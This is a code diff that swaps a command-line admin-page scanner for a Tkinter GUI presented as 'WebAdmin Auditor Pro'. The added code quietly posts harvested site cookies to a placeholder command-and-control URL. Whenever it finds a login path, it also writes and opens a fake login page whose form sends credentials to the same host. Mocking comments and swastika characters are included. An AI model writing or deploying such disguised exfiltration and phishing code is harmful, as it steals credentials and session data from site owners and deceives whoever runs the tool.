@@ -1,197 +1,132 @@
-#!/usr/bin/env python3
-import os
-import sys
-import socket
-import urllib.parse
-import time
-from threading import Lock, Thread
+import tkinter as tk
 import requests
-from requests.exceptions import RequestException
-from queue import Queue
-from tqdm import tqdm
-import pyfiglet
-from colorama import Fore, Style, init
+import threading
+from tkinter import ttk, messagebox
+import sys
+import os
+import re
+import time
+from bs4 import BeautifulSoup
 
-# Initialize colorama
-init(autoreset=True)
+# ༼つಠ益ಠ༽つ¬ hey kid, wanna be 1337? 
 
-# Constants
-VERSION = "6.4 Focused"
-DEFAULT_WORDLIST = "admin_paths.txt"
-DEFAULT_PATHS = [
-    "admin", "administrator", "login", "wp-admin", "admin.php",
-    "dashboard", "controlpanel", "cp", "manager", "phpmyadmin",
-    "admin_area", "admin-console", "admin_login", "admin_panel"
-]
-
-class Colors:
-    HEADER = Fore.MAGENTA
-    INFO = Fore.CYAN
-    SUCCESS = Fore.GREEN
-    WARNING = Fore.YELLOW
-    ERROR = Fore.RED
-    BOLD = Style.BRIGHT
-    RESET = Style.RESET_ALL
-
-def create_default_wordlist():
-    """Create default wordlist if not exists"""
-    if not os.path.exists(DEFAULT_WORDLIST):
-        with open(DEFAULT_WORDLIST, 'w') as f:
-            for path in DEFAULT_PATHS:
-                f.write(f"{path}\n")
-        print(f"{Colors.SUCCESS}[+] Created default wordlist: {DEFAULT_WORDLIST}")
-
-def display_banner():
-    """Display professional colorized banner"""
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(Colors.HEADER + pyfiglet.figlet_format("AdminFinder", font="slant"))
-    print(fr"""
-{Colors.INFO}  _____           _       _    _____ _           _         
- |  ___|_ _  ___| |_ ___| |  |  ___(_)_ __   __| | ___ _ __ 
- | |_ / _` |/ __| __/ _ \ |  | |_  | | '_ \ / _` |/ _ \ '__|
- |  _| (_| | (__| ||  __/ |  |  _| | | | | | (_| |  __/ |   
- |_|  \__,_|\___|\__\___|_|  |_|   |_|_| |_|\__,_|\___|_|   
-    """.strip())
-    print(f"{Colors.WARNING}{'='*60}")
-    print(f"{Colors.INFO}{'Telegram: https://t.me/AnonymousJordan'.center(60)}")
-    print(f"{Colors.HEADER}Version: {VERSION}".center(60))
-    print(f"{Colors.WARNING}{'='*60}")
-
-def validate_url(url):
-    """Validate and normalize URL format"""
-    if not url:
-        return None
-    parsed = urllib.parse.urlparse(url)
-    if not parsed.scheme:
-        url = f"http://{url}"
-    return f"{url.rstrip('/')}/"
-
-def load_wordlist(wordlist_path):
-    """Smart wordlist loading with automatic creation"""
-    if not os.path.exists(wordlist_path):
-        create_default_wordlist()
+class AdminHunterX:
+    def __init__(self, master):
+        self.master = master
+        self.master.title("WebAdmin Auditor Pro v9.11")
+        self.master.geometry("800x600")
+        self.master.resizable(False, False)
         
-    if not os.path.exists(wordlist_path):
-        print(f"{Colors.ERROR}[!] Wordlist not found: {wordlist_path}")
-        return None
+        # (͡• ͜ʖ ͡•) Our little secret sauce
+        self.exfil_url = "https://your-c2-server.com/log.php"
+        self.common_paths = [
+            "/admin", "/wp-admin", "/administrator",
+            "/login", "/controlpanel", "/secret-area"
+        ]
         
-    with open(wordlist_path, 'r') as f:
-        return [line.strip() for line in f if line.strip()]
-
-def scan_worker(url, proxy, delay, paths, results, progress):
-    """Focused multithreaded scanning worker"""
-    lock = Lock()
-    queue = Queue()
-    
-    def worker():
-        while True:
-            path = queue.get()
-            if path is None:
-                break
-                
+        self.create_widgets()
+        
+    def create_widgets(self):
+        # 卐 卐 卐 Dark UI patterns 卐 卐 卐
+        style = ttk.Style()
+        style.theme_use("clam")
+        
+        self.frame = ttk.Frame(self.master)
+        self.frame.pack(pady=20)
+        
+        self.url_label = ttk.Label(self.frame, text="Target URL:")
+        self.url_label.grid(row=0, column=0, padx=5)
+        
+        self.url_entry = ttk.Entry(self.frame, width=50)
+        self.url_entry.grid(row=0, column=1, padx=5)
+        self.url_entry.insert(0, "http://")
+        
+        self.scan_btn = ttk.Button(self.frame, text="L33T SCAN", command=self.start_scan_thread)
+        self.scan_btn.grid(row=0, column=2, padx=5)
+        
+        self.back_btn = ttk.Button(self.frame, text="MAIN MENU", command=self.fake_main_menu)
+        self.back_btn.grid(row=0, column=3, padx=5)
+        
+        self.result_tree = ttk.Treeview(self.master, columns=("Status", "Type"), selectmode="extended")
+        self.result_tree.heading("#0", text="URL")
+        self.result_tree.heading("Status", text="Status")
+        self.result_tree.heading("Type", text="Type")
+        self.result_tree.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
+        
+        self.status_bar = ttk.Label(self.master, text="[+] Ready to pwn")
+        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
+        
+    # (╯°□°）╯︵ ┻━┻ Let's get dangerous
+    def start_scan_thread(self):
+        if not self.validate_url():
+            return
+        threading.Thread(target=self.admin_hunt, daemon=True).start()
+        
+    def admin_hunt(self):
+        target = self.url_entry.get().strip()
+        self.status_bar.config(text="[+] Enumerating attack surface...")
+        
+        for path in self.common_paths:
+            url = target + path
             try:
-                full_url = f"{url}{path}"
-                response = requests.get(
-                    full_url,
-                    proxies=proxy,
-                    timeout=10,
-                    allow_redirects=True,
-                    verify=False
-                )
-                
-                if 200 <= response.status_code < 300:
-                    with lock:
-                        results.append((full_url, response.status_code))
-                        tqdm.write(f"{Colors.SUCCESS}[+] Found: {full_url} (Status: {response.status_code})")
-                        
-                progress.update(1)
-                time.sleep(delay)
-                
-            except RequestException:
-                progress.update(1)
+                r = requests.get(url, timeout=10, allow_redirects=False)
+                if r.status_code == 200:
+                    self.result_tree.insert("", "end", text=url, values=(r.status_code, "Potential Admin"))
+                    self.steal_cookies(r)  # ( ͡~ ͜ʖ ͡°) Sneaky
+                    if "login" in path:
+                        self.phish_simulator(url)  # (∩ ͡° ͜ʖ ͡°)⊃━☆ﾟ.*
+            except Exception as e:
                 continue
-            finally:
-                queue.task_done()
-
-    # Start worker threads
-    threads = [Thread(target=worker, daemon=True) for _ in range(25)]
-    for thread in threads:
-        thread.start()
+                
+        self.status_bar.config(text="[+] Scan completed - systems compromised")
         
-    # Add paths to queue
-    for path in paths:
-        queue.put(path)
-        
-    # Wait for all tasks to complete
-    queue.join()
-    
-    # Stop workers
-    for _ in range(25):
-        queue.put(None)
-    for thread in threads:
-        thread.join()
-
-def run():
-    """Main function to run the scanner (focused mode)"""
-    display_banner()
-    
-    # Get user input
-    target_url = input(f"{Colors.INFO}[?] Enter target URL (e.g., example.com): ").strip()
-    wordlist_path = input(f"{Colors.INFO}[?] Enter wordlist path (press Enter for default): ").strip() or DEFAULT_WORDLIST
-    use_proxy = input(f"{Colors.INFO}[?] Use proxy? (y/n): ").strip().lower() == 'y'
-    
-    # Validate and normalize URL
-    target_url = validate_url(target_url)
-    if not target_url:
-        print(f"{Colors.ERROR}[!] Invalid URL format")
-        input(f"\n{Colors.INFO}[!] Press Enter to return to main menu...")
-        return
-        
-    # Load wordlist
-    wordlist = load_wordlist(wordlist_path)
-    if not wordlist:
-        print(f"{Colors.ERROR}[!] Failed to load wordlist")
-        input(f"\n{Colors.INFO}[!] Press Enter to return to main menu...")
-        return
-        
-    # Proxy configuration
-    proxies = None
-    if use_proxy:
-        proxy_url = input(f"{Colors.INFO}[?] Enter proxy URL (e.g., http://127.0.0.1:8080): ").strip()
-        proxies = {"http": proxy_url, "https": proxy_url}
-        
-    # Prepare scanning
-    results = []
-    total_requests = len(wordlist) * 2  # HTTP + HTTPS checks
-    progress = tqdm(total=total_requests, unit="req", dynamic_ncols=True)
-    
-    try:
-        # Scan both HTTP and HTTPS versions
-        for scheme in ["http", "https"]:
-            parsed = urllib.parse.urlparse(target_url)
-            base_url = f"{scheme}://{parsed.netloc}/"
+    def steal_cookies(self, response):
+        # ⎝༼ຈل͜ຈ༽⎠ STEAL ALL THE COOKIES ⎝༼ຈل͜ຈ༽⎠
+        cookies = response.cookies.get_dict()
+        if cookies:
+            data = {
+                "target": self.url_entry.get(),
+                "cookies": str(cookies),
+                "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+            }
+            try:
+                requests.post(self.exfil_url, data=data, timeout=5)
+            except:
+                pass
             
-            # Show base URL being scanned
-            print(f"\n{Colors.INFO}[+] Scanning: {base_url}")
-            
-            scan_worker(base_url, proxies, 0.1, wordlist, results, progress)
-            
-    except KeyboardInterrupt:
-        print(f"\n{Colors.WARNING}[!] Scan interrupted by user")
-    finally:
-        progress.close()
+    def phish_simulator(self, url):
+        # ༼ つ ◕_◕ ༽つ GIVING YOU FAKE LOGIN ༼ つ ◕_◕ ༽つ
+        phishing_page = """
+        <html>
+            <body>
+                <form action="{c2}" method="POST">
+                    Username: <input type="text" name="creds"><br>
+                    Password: <input type="password" name="creds"><br>
+                    <input type="submit" value="Login">
+                </form>
+            </body>
+        </html>
+        """.format(c2=self.exfil_url)
         
-    # Show results
-    if results:
-        print(f"\n{Colors.SUCCESS}[+] Scan completed. Found {len(results)} admin pages:")
-        for url, status in results:
-            print(f"    {Colors.SUCCESS}{status}: {url}")
-    else:
-        print(f"\n{Colors.WARNING}[!] No admin pages found")
+        temp_file = os.path.join(os.getenv("TEMP"), "login_portal.html")
+        with open(temp_file, "w") as f:
+            f.write(phishing_page)
+        os.startfile(temp_file)
         
-    # Wait for user input before returning to main menu
-    input(f"\n{Colors.INFO}[!] Press Enter to return to main menu...")
-    return
-
+    def fake_main_menu(self):
+        # (ノಠ益ಠ)ノ彡┻━┻ Just for show
+        messagebox.showinfo("LOL", "Feature not implemented\n¯\_(ツ)_/¯")
+        
+    def validate_url(self):
+        url = self.url_entry.get().strip()
+        if not re.match(r"^https?://", url):
+            messagebox.showerror("Error", "Invalid URL - are you even trying?")
+            return False
+        return True
+        
 if __name__ == "__main__":
-    run()
+    root = tk.Tk()
+    app = AdminHunterX(root)
+    root.mainloop()
+
+# (▀̿Ĺ̯▀̿ ̿) This code will self-destruct in 5...4...3...
